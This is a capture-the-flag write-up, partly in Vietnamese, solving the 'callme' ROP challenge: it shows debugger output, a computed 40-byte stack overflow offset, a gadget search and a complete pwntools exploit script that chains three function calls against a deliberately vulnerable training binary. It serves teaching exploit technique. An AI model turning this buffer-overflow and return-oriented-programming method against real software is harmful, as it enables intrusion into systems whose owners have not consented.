# callme - challenge 3

[binary file and my exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/ROP/chall3_callme)

> Hint
>
>> You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall3_callme$ file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
```

```python
pwndbg> checksec
[*] '/mnt/d/pwn_myself/ROP/chall3_callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

```cpp
int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 512uLL);
  return puts("Thank you!");
}
```

```cpp
void __noreturn usefulFunction()
{
  callme_three();
  callme_two(4LL, 5LL, 6LL);
  callme_one(4LL, 5LL, 6LL);
  exit(1);
}
```

Với hint mà đề bài cho thì ở chall này ta phải gọi đuộc 3 hàm callme() với 3 tham số tương ứng như trên.

Với checksec như trên thì chúng ta không thể dùng shellcode với **NX enable**. Thay vào đó sẽ dùng ROP với overflow.

Let's go:

```python
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
```
Ở đây ta có được địa chỉ của 3 hàm callme()

tiếp đến xem xem phải overflow bao nhiêu bytes để đến được return address:

```python
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4008e0 <pwnme+72>             call   read@plt                      <read@plt>
        fd: 0x0 (/dev/pts/5)
        buf: 0x7fffffffe050 ◂— 0x0
        nbytes: 0x200

   0x4008e5 <pwnme+77>             mov    edi, 0x400a16
   0x4008ea <pwnme+82>             call   puts@plt                      <puts@plt>

   0x4008ef <pwnme+87>             nop
   0x4008f0 <pwnme+88>             leave
   0x4008f1 <pwnme+89>             ret

   0x4008f2 <usefulFunction>       push   rbp
   0x4008f3 <usefulFunction+1>     mov    rbp, rsp
   0x4008f6 <usefulFunction+4>     mov    edx, 6
   0x4008fb <usefulFunction+9>     mov    esi, 5
   0x400900 <usefulFunction+14>    mov    edi, 4
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rax rsi rsp 0x7fffffffe050 ◂— 0x0
... ↓                3 skipped
04:0020│ rbp         0x7fffffffe070 —▸ 0x7fffffffe080 ◂— 0x1
05:0028│             0x7fffffffe078 —▸ 0x400887 (main+64) ◂— mov edi, 0x4009e7
06:0030│             0x7fffffffe080 ◂— 0x1
07:0038│             0x7fffffffe088 —▸ 0x7ffff7a01d90 (__libc_start_call_main+128) ◂— mov edi, eax
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────

```
string nhập vào sẽ được lưu ở ***0x7fffffffe050***

```python
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x4008e0 <pwnme+72>    call   read@plt                      <read@plt>

   0x4008e5 <pwnme+77>    mov    edi, 0x400a16
   0x4008ea <pwnme+82>    call   puts@plt                      <puts@plt>

   0x4008ef <pwnme+87>    nop
   0x4008f0 <pwnme+88>    leave
 ► 0x4008f1 <pwnme+89>    ret                                  <0x400887; main+64>
    ↓
   0x400887 <main+64>     mov    edi, 0x4009e7
   0x40088c <main+69>     call   puts@plt                      <puts@plt>

   0x400891 <main+74>     mov    eax, 0
   0x400896 <main+79>     pop    rbp
   0x400897 <main+80>     ret
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe078 —▸ 0x400887 (main+64) ◂— mov edi, 0x4009e7
01:0008│ rbp 0x7fffffffe080 ◂— 0x1
02:0010│     0x7fffffffe088 —▸ 0x7ffff7a01d90 (__libc_start_call_main+128) ◂— mov edi, eax
03:0018│     0x7fffffffe090 ◂— 0x0

```

return address = 0x7fffffffe078

byte overflow = 0x7fffffffe078 - 0x7fffffffe050 = 40 bytes

Chall này ở chuỗi các chall dùng kỹ thuật ROP :)), nên tất nhiên ta đi tìm ROP gadget phù hợp.

Ở đây cần truyền vào 3 tham số cho 3 hàm callme, và là kiến trúc 64-bit => các tham số sẽ được lưu ở các thanh ghi tương ứng như đã nói ở các chall trước => cần Gadget pop rdi,rsi,rdx 

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall3_callme$ ROPgadget --binary callme | grep "pop rdi ; pop rsi ; pop rdx ; ret"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret

```
Thêm nữa do đây là kiến trúc 64-bit như đã nói ở chall trước ta cần tránh movaps => cần *ret gadget*

***0x00000000004006be : ret***

### Exploit

```python
from pwn import *

r = process("./callme")
#gdb.attach(r, api = True)

callme1 = 0x400720
callme2 = 0x400740
callme3 = 0x4006f0

agr1 = 0xdeadbeefdeadbeef
agr2 = 0xcafebabecafebabe
agr3 = 0xd00df00dd00df00d

ret_gadget = 0x00000000004006be
pop_rdi_rsi_rdx_ret = 0x000000000040093c

agr =  p64(ret_gadget) + p64(pop_rdi_rsi_rdx_ret) + p64(agr1) + p64(agr2) + p64(agr3)

payload = b'A'*40 + agr + p64(callme1) + agr + p64(callme2) + agr + p64(callme3)

r.sendline(payload)

r.interactive()

```